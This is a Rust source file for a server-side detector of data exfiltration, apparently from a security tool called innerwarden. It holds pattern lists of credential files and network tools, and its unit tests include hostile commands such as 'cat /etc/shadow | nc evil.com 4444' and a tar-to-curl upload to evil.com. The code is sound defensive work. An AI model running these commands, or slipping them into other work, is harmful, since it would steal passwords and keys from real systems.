use std::collections::HashMap;

use chrono::{DateTime, Duration, Utc};
use innerwarden_core::{entities::EntityRef, event::Event, event::Severity, incident::Incident};

/// Sensitive file patterns that indicate credential/data access.
const SENSITIVE_PATHS: &[&str] = &[
    "/etc/shadow",
    "/etc/passwd",
    "/etc/master.passwd",
    "/etc/security/passwd",
];

/// Sensitive path suffixes/patterns.
const SENSITIVE_SUFFIXES: &[&str] = &[
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    ".ssh/id_ecdsa",
    ".ssh/id_dsa",
    ".ssh/authorized_keys",
    ".ssh/known_hosts",
    ".aws/credentials",
    ".aws/config",
    ".env",
    ".pem",
    ".key",
    ".p12",
    ".pfx",
];

/// Sensitive file extensions for database dumps.
const SENSITIVE_EXTENSIONS: &[&str] = &[".sql", ".dump", ".bak"];

/// Command patterns that pipe sensitive files to network tools.
const EXFIL_COMMAND_PATTERNS: &[(&str, &str)] = &[
    ("cat", "nc"),
    ("cat", "ncat"),
    ("cat", "netcat"),
    ("cat", "curl"),
    ("cat", "wget"),
    ("tar", "curl"),
    ("tar", "nc"),
    ("tar", "ncat"),
    ("tar", "ssh"),
    ("scp", "shadow"),
    ("scp", "passwd"),
    ("scp", ".ssh"),
    ("scp", ".aws"),
    ("scp", ".env"),
    ("scp", ".pem"),
    ("scp", ".key"),
];

/// Detects data exfiltration from the server.
///
/// Two detection modes:
/// 1. **Correlation**: Tracks when sensitive files are read, then checks if
///    the same process makes an outbound network connection within a time window.
/// 2. **Command pattern**: Detects commands that pipe sensitive files directly
///    to network tools (e.g., `cat /etc/shadow | nc evil.com 4444`).
pub struct DataExfiltrationDetector {
    correlation_window: Duration,
    cooldown: Duration,
    /// pid → (timestamp, file_path) - tracks sensitive file reads
    read_state: HashMap<u32, (DateTime<Utc>, String)>,
    /// Alert cooldown tracking
    alerted: HashMap<String, DateTime<Utc>>,
    host: String,
}

impl DataExfiltrationDetector {
    pub fn new(
        host: impl Into<String>,
        correlation_window_secs: u64,
        cooldown_seconds: u64,
    ) -> Self {
        Self {
            correlation_window: Duration::seconds(correlation_window_secs as i64),
            cooldown: Duration::seconds(cooldown_seconds as i64),
            read_state: HashMap::new(),
            alerted: HashMap::new(),
            host: host.into(),
        }
    }

    /// Check if a path is a sensitive file.
    fn is_sensitive_path(path: &str) -> bool {
        if SENSITIVE_PATHS.contains(&path) {
            return true;
        }
        for suffix in SENSITIVE_SUFFIXES {
            if path.ends_with(suffix) || path.contains(suffix) {
                return true;
            }
        }
        for ext in SENSITIVE_EXTENSIONS {
            if path.ends_with(ext) {
                return true;
            }
        }
        false
    }

    /// Check if a command contains a direct exfiltration pattern.
    fn is_exfil_command(command: &str) -> bool {
        let lower = command.to_lowercase();

        // Check for piping sensitive files to network tools
        for (source_tool, network_tool) in EXFIL_COMMAND_PATTERNS {
            if lower.contains(source_tool) && lower.contains(network_tool) {
                // Verify there's also a sensitive reference
                if Self::command_references_sensitive(&lower) {
                    return true;
                }
                // tar + network tool is suspicious regardless
                if *source_tool == "tar" {
                    return true;
                }
                // scp patterns already include sensitive references
                if *source_tool == "scp" {
                    return true;
                }
            }
        }

        false
    }

    /// Check if a command references sensitive files.
    fn command_references_sensitive(command: &str) -> bool {
        for path in SENSITIVE_PATHS {
            if command.contains(path) {
                return true;
            }
        }
        for suffix in SENSITIVE_SUFFIXES {
            if command.contains(suffix) {
                return true;
            }
        }
        false
    }

    pub fn process(&mut self, event: &Event) -> Option<Incident> {
        let now = event.ts;

        match event.kind.as_str() {
            // Track sensitive file reads
            "file.read_access" => {
                let path = event.details["path"].as_str().unwrap_or("");
                if path.is_empty() || !Self::is_sensitive_path(path) {
                    return None;
                }

                let pid = event.details["pid"].as_u64().unwrap_or(0) as u32;
                if pid == 0 {
                    return None;
                }

                self.read_state.insert(pid, (now, path.to_string()));

                // Prune stale entries
                if self.read_state.len() > 5000 {
                    let cutoff = now - self.correlation_window;
                    self.read_state.retain(|_, (ts, _)| *ts > cutoff);
                }

                None
            }

            // Check if a process that read sensitive files is now connecting out
            "network.outbound_connect" | "network.connection" => {
                let pid = event.details["pid"].as_u64().unwrap_or(0) as u32;
                if pid == 0 {
                    return None;
                }

                let dst_ip = event.details["dst_ip"].as_str().unwrap_or("");
                let dst_port = event.details["dst_port"].as_u64().unwrap_or(0) as u16;
                let comm = event.details["comm"]
                    .as_str()
                    .unwrap_or("unknown")
                    .to_string();

                // Check if this pid read a sensitive file recently
                if let Some((read_ts, sensitive_file)) = self.read_state.get(&pid) {
                    if now - *read_ts <= self.correlation_window {
                        let alert_key = format!("exfil:{}:{}:{}", comm, sensitive_file, dst_ip);
                        if self.is_in_cooldown(&alert_key, now) {
                            return None;
                        }
                        self.alerted.insert(alert_key, now);

                        let sensitive_file = sensitive_file.clone();

                        self.prune_stale(now);

                        return Some(Incident {
                            ts: now,
                            host: self.host.clone(),
                            incident_id: format!(
                                "data_exfil:{}:{}:{}",
                                comm,
                                dst_ip,
                                now.format("%Y-%m-%dT%H:%MZ")
                            ),
                            severity: Severity::High,
                            title: format!(
                                "Data exfiltration: {comm} read {sensitive_file} then connected to {dst_ip}"
                            ),
                            summary: format!(
                                "Data exfiltration: {comm} read {sensitive_file} then connected to {dst_ip}:{dst_port}"
                            ),
                            evidence: serde_json::json!([{
                                "kind": "data_exfiltration",
                                "pattern": "read_then_connect",
                                "sensitive_file": sensitive_file,
                                "comm": comm,
                                "pid": pid,
                                "dst_ip": dst_ip,
                                "dst_port": dst_port,
                            }]),
                            recommended_checks: vec![
                                format!("Investigate process {comm} (pid={pid}) - why did it read {sensitive_file}?"),
                                format!("Check destination: whois {dst_ip}"),
                                format!("Review network traffic: ss -tunp | grep {pid}"),
                                "Check if the file was modified: stat the sensitive file".to_string(),
                                "If confirmed: block the destination IP and kill the process".to_string(),
                            ],
                            tags: vec![
                                "exfiltration".to_string(),
                                "data-theft".to_string(),
                            ],
                            entities: vec![EntityRef::ip(dst_ip)],
                        });
                    }
                }

                None
            }

            // Detect command-based exfiltration patterns
            "shell.command_exec" => {
                let command = event.details["command"].as_str().unwrap_or("");
                let comm = event.details["comm"]
                    .as_str()
                    .unwrap_or("unknown")
                    .to_string();

                // Skip build tools and package managers — their argv contains
                // many system paths that false-positive as exfiltration patterns.
                let build_tools = [
                    "collect2",
                    "ld",
                    "cc",
                    "cc1",
                    "cc1plus",
                    "as",
                    "lto-wrapper",
                    "cargo",
                    "rustc",
                    "gcc",
                    "g++",
                    "clang",
                    "make",
                    "cmake",
                    "ninja",
                    "dpkg",
                    "apt",
                    "apt-get",
                    "npm",
                    "pip",
                    "go",
                ];
                let comm_base = comm.split('/').next_back().unwrap_or(&comm);
                if build_tools.iter().any(|t| comm_base.starts_with(t)) {
                    return None;
                }

                if command.is_empty() || !Self::is_exfil_command(command) {
                    return None;
                }

                let pid = event.details["pid"].as_u64().unwrap_or(0) as u32;
                let uid = event.details["uid"].as_u64().unwrap_or(0) as u32;

                let alert_key = format!("exfil_cmd:{}:{}", comm, pid);
                if self.is_in_cooldown(&alert_key, now) {
                    return None;
                }
                self.alerted.insert(alert_key, now);

                self.prune_stale(now);

                Some(Incident {
                    ts: now,
                    host: self.host.clone(),
                    incident_id: format!(
                        "data_exfil_cmd:{}:{}:{}",
                        comm,
                        pid,
                        now.format("%Y-%m-%dT%H:%MZ")
                    ),
                    severity: Severity::High,
                    title: format!("Data exfiltration command detected: {comm}"),
                    summary: format!(
                        "Data exfiltration via command: {comm} (pid={pid}, uid={uid}) executed: {command}"
                    ),
                    evidence: serde_json::json!([{
                        "kind": "data_exfiltration",
                        "pattern": "command_pipe",
                        "command": command,
                        "comm": comm,
                        "pid": pid,
                        "uid": uid,
                    }]),
                    recommended_checks: vec![
                        format!("Investigate process {comm} (pid={pid}) - who started it?"),
                        "Check for stolen data: review network logs".to_string(),
                        format!("Review command: {command}"),
                        "If confirmed: block the destination and rotate compromised credentials".to_string(),
                    ],
                    tags: vec![
                        "exfiltration".to_string(),
                        "data-theft".to_string(),
                    ],
                    entities: vec![],
                })
            }

            _ => None,
        }
    }

    fn is_in_cooldown(&self, key: &str, now: DateTime<Utc>) -> bool {
        if let Some(&last) = self.alerted.get(key) {
            now - last < self.cooldown
        } else {
            false
        }
    }

    fn prune_stale(&mut self, now: DateTime<Utc>) {
        if self.alerted.len() > 500 {
            let cutoff = now - self.cooldown;
            self.alerted.retain(|_, ts| *ts > cutoff);
        }
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn file_read_event(path: &str, comm: &str, pid: u32, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "file.read_access".to_string(),
            severity: Severity::Info,
            summary: format!("File read: {path}"),
            details: serde_json::json!({
                "pid": pid,
                "uid": 1000,
                "comm": comm,
                "path": path,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    fn connect_event(
        comm: &str,
        pid: u32,
        dst_ip: &str,
        dst_port: u16,
        ts: DateTime<Utc>,
    ) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "network.outbound_connect".to_string(),
            severity: Severity::Info,
            summary: format!("{comm} connecting to {dst_ip}:{dst_port}"),
            details: serde_json::json!({
                "pid": pid,
                "uid": 1000,
                "comm": comm,
                "dst_ip": dst_ip,
                "dst_port": dst_port,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![EntityRef::ip(dst_ip)],
        }
    }

    fn command_event(command: &str, comm: &str, pid: u32, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "shell.command_exec".to_string(),
            severity: Severity::Info,
            summary: format!("Shell command: {command}"),
            details: serde_json::json!({
                "pid": pid,
                "uid": 1000,
                "comm": comm,
                "command": command,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    #[test]
    fn detects_shadow_read_then_connect() {
        let mut det = DataExfiltrationDetector::new("test", 60, 300);
        let now = Utc::now();

        // Process reads /etc/shadow
        assert!(det
            .process(&file_read_event("/etc/shadow", "python3", 1234, now))
            .is_none());

        // Same process connects outbound within window
        let inc = det.process(&connect_event(
            "python3",
            1234,
            "203.0.113.5",
            4444,
            now + Duration::seconds(5),
        ));
        assert!(inc.is_some());
        let inc = inc.unwrap();
        assert_eq!(inc.severity, Severity::High);
        assert!(inc.title.contains("/etc/shadow"));
        assert!(inc.title.contains("203.0.113.5"));
        assert!(inc.tags.contains(&"exfiltration".to_string()));
    }

    #[test]
    fn detects_ssh_key_read_then_connect() {
        let mut det = DataExfiltrationDetector::new("test", 60, 300);
        let now = Utc::now();

        assert!(det
            .process(&file_read_event("/root/.ssh/id_rsa", "bash", 1234, now))
            .is_none());

        let inc = det.process(&connect_event(
            "bash",
            1234,
            "10.0.0.5",
            8080,
            now + Duration::seconds(30),
        ));
        assert!(inc.is_some());
        assert!(inc.unwrap().title.contains(".ssh/id_rsa"));
    }

    #[test]
    fn detects_aws_credentials_read_then_connect() {
        let mut det = DataExfiltrationDetector::new("test", 60, 300);
        let now = Utc::now();

        assert!(det
            .process(&file_read_event(
                "/home/user/.aws/credentials",
                "python3",
                2000,
                now
            ))
            .is_none());

        let inc = det.process(&connect_event(
            "python3",
            2000,
            "1.2.3.4",
            443,
            now + Duration::seconds(10),
        ));
        assert!(inc.is_some());
        assert!(inc.unwrap().title.contains(".aws/credentials"));
    }

    #[test]
    fn no_alert_outside_correlation_window() {
        let mut det = DataExfiltrationDetector::new("test", 60, 300);
        let now = Utc::now();

        assert!(det
            .process(&file_read_event("/etc/shadow", "python3", 1234, now))
            .is_none());

        // Connect after window expires
        let inc = det.process(&connect_event(
            "python3",
            1234,
            "203.0.113.5",
            4444,
            now + Duration::seconds(61),
        ));
        assert!(inc.is_none());
    }

    #[test]
    fn no_alert_for_different_pid() {
        let mut det = DataExfiltrationDetector::new("test", 60, 300);
        let now = Utc::now();

        // PID 1234 reads sensitive file
        assert!(det
            .process(&file_read_event("/etc/shadow", "python3", 1234, now))
            .is_none());

        // Different PID connects - no correlation
        let inc = det.process(&connect_event(
            "curl",
            5678,
            "203.0.113.5",
            4444,
            now + Duration::seconds(5),
        ));
        assert!(inc.is_none());
    }

    #[test]
    fn detects_cat_shadow_pipe_nc() {
        let mut det = DataExfiltrationDetector::new("test", 60, 300);
        let now = Utc::now();

        let inc = det.process(&command_event(
            "cat /etc/shadow | nc evil.com 4444",
            "bash",
            1234,
            now,
        ));
        assert!(inc.is_some());
        let inc = inc.unwrap();
        assert_eq!(inc.severity, Severity::High);
        assert!(inc.tags.contains(&"exfiltration".to_string()));
    }

    #[test]
    fn detects_scp_shadow() {
        let mut det = DataExfiltrationDetector::new("test", 60, 300);
        let now = Utc::now();

        let inc = det.process(&command_event(
            "scp /etc/shadow user@evil.com:/tmp/",
            "scp",
            1234,
            now,
        ));
        assert!(inc.is_some());
    }

    #[test]
    fn detects_tar_pipe_curl() {
        let mut det = DataExfiltrationDetector::new("test", 60, 300);
        let now = Utc::now();

        let inc = det.process(&command_event(
            "tar czf - /home/user | curl -X POST http://evil.com/upload -d @-",
            "bash",
            1234,
            now,
        ));
        assert!(inc.is_some());
    }

    #[test]
    fn ignores_normal_file_reads() {
        let mut det = DataExfiltrationDetector::new("test", 60, 300);
        let now = Utc::now();

        assert!(det
            .process(&file_read_event("/var/log/syslog", "tail", 1234, now))
            .is_none());
        assert!(det
            .process(&file_read_event("/etc/hostname", "cat", 1235, now))
            .is_none());
    }

    #[test]
    fn ignores_normal_commands() {
        let mut det = DataExfiltrationDetector::new("test", 60, 300);
        let now = Utc::now();

        assert!(det
            .process(&command_event("curl http://example.com", "curl", 1234, now))
            .is_none());
        assert!(det
            .process(&command_event("cat /var/log/syslog", "cat", 1235, now))
            .is_none());
    }

    #[test]
    fn cooldown_suppresses_realert() {
        let mut det = DataExfiltrationDetector::new("test", 60, 300);
        let now = Utc::now();

        // First detection
        assert!(det
            .process(&file_read_event("/etc/shadow", "python3", 1234, now))
            .is_none());
        assert!(det
            .process(&connect_event(
                "python3",
                1234,
                "203.0.113.5",
                4444,
                now + Duration::seconds(5)
            ))
            .is_some());

        // Re-read and re-connect within cooldown - suppressed
        assert!(det
            .process(&file_read_event(
                "/etc/shadow",
                "python3",
                1234,
                now + Duration::seconds(10)
            ))
            .is_none());
        assert!(det
            .process(&connect_event(
                "python3",
                1234,
                "203.0.113.5",
                4444,
                now + Duration::seconds(15)
            ))
            .is_none());
    }

    #[test]
    fn detects_env_file_exfiltration() {
        let mut det = DataExfiltrationDetector::new("test", 60, 300);
        let now = Utc::now();

        assert!(det
            .process(&file_read_event("/app/.env", "node", 3000, now))
            .is_none());

        let inc = det.process(&connect_event(
            "node",
            3000,
            "198.51.100.1",
            443,
            now + Duration::seconds(2),
        ));
        assert!(inc.is_some());
        assert!(inc.unwrap().title.contains(".env"));
    }

    #[test]
    fn detects_database_dump_exfiltration() {
        let mut det = DataExfiltrationDetector::new("test", 60, 300);
        let now = Utc::now();

        assert!(det
            .process(&file_read_event("/tmp/backup.sql", "python3", 4000, now))
            .is_none());

        let inc = det.process(&connect_event(
            "python3",
            4000,
            "198.51.100.2",
            8080,
            now + Duration::seconds(3),
        ));
        assert!(inc.is_some());
        assert!(inc.unwrap().title.contains("backup.sql"));
    }
}
